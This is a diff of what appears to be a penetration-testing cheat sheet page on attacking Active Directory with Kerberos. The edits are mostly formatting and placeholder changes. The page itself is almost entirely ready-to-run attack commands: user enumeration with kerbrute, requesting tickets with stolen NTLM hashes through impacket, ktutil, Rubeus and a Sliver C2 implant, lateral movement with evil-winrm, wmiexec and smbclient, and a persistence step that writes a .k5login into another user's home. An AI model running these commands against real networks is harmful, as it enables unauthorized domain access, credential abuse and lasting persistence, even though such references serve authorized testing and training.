@@ -9,13 +9,9 @@ tags: ["kerberos", "kerbrute", "rubeus", "active directory", "ad", "domain contr
 {{< tab set1 tab1 active >}}kerbrute{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
-<div>
-
 ```console
 kerbrute userenum --domain <DOMAIN> --dc <DC> <USERNAMES_FILE>
 ```
-
-</div>
 
 <small>*Ref: [kerbrute](https://github.com/ropnop/kerbrute)*</small>
 
@@ -26,55 +22,23 @@ kerbrute userenum --domain <DOMAIN> --dc <DC> <USERNAMES_FILE>
 {{< tab set2 tab1 active >}}username-anarchy{{< /tab >}}
 {{< tabcontent set2 tab1 >}}
 
-<div>
-
 ```console
 ./username-anarchy -i <USERS_FILE> | tee <USERNAMES_FILE>
 ```
-
-</div>
 
 <small>*Ref: [username-anarchy](https://github.com/urbanadventurer/username-anarchy)*</small>
 
 {{< /tabcontent >}}
 
-<br>
-
 ---
 
 ### Generate Kerberos ticket (From Linux)
 
-{{< tab set3 tab1 active >}}Impacket{{< /tab >}}
-{{< tab set3 tab2 >}}Kinit{{< /tab >}}
+{{< tab set3 tab1 active >}}Kinit{{< /tab >}}
+{{< tab set3 tab2 >}}Impacket{{< /tab >}}
 {{< tabcontent set3 tab1 >}}
 
-<div>
-
-```console
-# Auth with password
-sudo ntpdate -s <DC> && impacket-getTGT '<DOMAIN>/<USER>'
-```
-
-```console
-# Auth with hash
-sudo ntpdate -s <DC> && impacket-getTGT -hashes :<HASH> '<DOMAIN>/<USER>'
-```
-
-```console
-export KRB5CCNAME=<USER>.ccache
-```
-
-```console
-# Check ticket
-klist
-```
-
-</div>
-
-{{< /tabcontent >}}
-{{< tabcontent set3 tab2 >}}
-
-<div>
+#### 1. Set up
 
 ```console
 # Step 0: Installation
@@ -114,29 +78,20 @@ nameserver <TARGET>
 sudo ntpdate -s <DC>
 ```
 
-</div>
-
-#### 2a. Without creds
-
-<div>
+#### 2a. With Password
 
 ```console
-# Generate kerberos ticket for user
 kinit <USER>
 ```
 
-</div>
-
 #### 2b. With NTLM hash
-
-<div>
 
 ```console
 ktutil
 ```
 
 ```console
-add_entry -p administrator@<DOMAIN> -k 1 -key -e rc4-hmac
+add_entry -p <USER>@<DOMAIN> -k 1 -key -e rc4-hmac
 ```
 
 ```console
@@ -144,7 +99,7 @@ add_entry -p administrator@<DOMAIN> -k 1 -key -e rc4-hmac
 ```
 
 ```console
-write_kt administrator.keytab
+write_kt <USER>.keytab
 ```
 
 ```console
@@ -152,20 +107,37 @@ exit
 ```
 
 ```console
-kinit -V -k -t administrator.keytab -f administrator@<DOMAIN>
+kinit -V -k -t <USER>.keytab -f <USER>@<DOMAIN>
 ```
 
-</div>
-
 #### 3. Check ticket
-
-<div>
 
 ```console
 klist
 ```
 
-</div>
+{{< /tabcontent >}}
+{{< tabcontent set3 tab2 >}}
+
+```console
+# With password
+sudo ntpdate -s <DC> && impacket-getTGT '<DOMAIN>/<USER>'
+```
+
+```console
+# With hash
+sudo ntpdate -s <DC> && impacket-getTGT -hashes :<HASH> '<DOMAIN>/<USER>'
+```
+
+```console
+# Import ticket
+export KRB5CCNAME=<USER>.ccache
+```
+
+```console
+# Check ticket
+klist
+```
 
 {{< /tabcontent >}}
 
@@ -174,24 +146,20 @@ klist
 {{< tab set4 tab1 active >}}rubeus{{< /tab >}}
 {{< tabcontent set4 tab1 >}}
 
-<div>
-
 ```console
-# Auth with password
-.\Rubeus.exe asktgt /user:<USER> /password:'<PASSWORD>' /enctype:AES256 /domain:<DOMAIN> /dc:<DC> /ptt /nowrap
+# With password
+.\rubeus.exe asktgt /user:<USER> /password:'<PASSWORD>' /enctype:AES256 /domain:<DOMAIN> /dc:<DC> /ptt /nowrap
 ```
 
 ```console
-# Auth with hash
-.\Rubeus.exe asktgt /user:<USER> /rc4:'<HASH>' /domain:<DOMAIN> /dc:<DC> /ptt /nowrap
+# With hash
+.\rubeus.exe asktgt /user:<USER> /rc4:'<HASH>' /domain:<DOMAIN> /dc:<DC> /ptt /nowrap
 ```
 
 ```console
 # Check
 klist
 ```
-
-</div>
 
 {{< /tabcontent >}}
 
@@ -200,15 +168,13 @@ klist
 {{< tab set5 tab1 active >}}Sliver{{< /tab >}}
 {{< tabcontent set5 tab1 >}}
 
-<div>
-
 ```console
-# Auth with password
+# With password
 rubeus -- 'asktgt /user:<USER> /password:<PASSWORD> /enctype:AES256 /domain:<DOMAIN> /dc:<DC> /ptt /nowrap'
 ```
 
 ```console
-# Auth with hash
+# With hash
 rubeus -- 'asktgt /user:<USER> /rc4:<HASH> /domain:<DOMAIN> /dc:<DC> /ptt /nowrap'
 ```
 
@@ -217,11 +183,7 @@ rubeus -- 'asktgt /user:<USER> /rc4:<HASH> /domain:<DOMAIN> /dc:<DC> /ptt /nowra
 c2tc-klist
 ```
 
-</div>
-
 {{< /tabcontent >}}
-
-<br>
 
 ---
 
@@ -231,8 +193,6 @@ c2tc-klist
 {{< tab set6 tab1 active >}}evil-winrm{{< /tab >}}
 {{< tab set6 tab2 >}}wmiexec{{< /tab >}}
 {{< tabcontent set6 tab1 >}}
-
-<div>
 
 ```console
 # Step 1: Edit '/etc/krb5.conf' (All uppercase)
@@ -257,47 +217,27 @@ c2tc-klist
 sudo ntpdate -s <DC> && evil-winrm -i <TARGET_DOMAIN> -r <DOMAIN>
 ```
 
-</div>
-
 {{< /tabcontent >}}
 {{< tabcontent set6 tab2 >}}
-
-<div>
 
 ```console
 sudo ntpdate -s <DC> && impacket-wmiexec '<DOMAIN>/<USER>@<TARGET_DOMAIN>' -k -no-pass
 ```
 
-</div>
-
 {{< /tabcontent >}}
-
-<br>
 
 ---
 
 ### Connect to SMB with Kerberos
 
-<div>
-
 ```console
 sudo ntpdate -s <DC> && impacket-smbclient '<DOMAIN>/<USER>@<TARGET_DOMAIN>' -k -no-pass
 ```
-
-</div>
-
-<br>
 
 ---
 
 ### Add Kerberos Access in Linux
 
-<div>
-
 ```console
 echo "<USER>@<DOMAIN>" > /home/<TARGET_USER>/.k5login
 ```
-
-</div>
-
-<br>
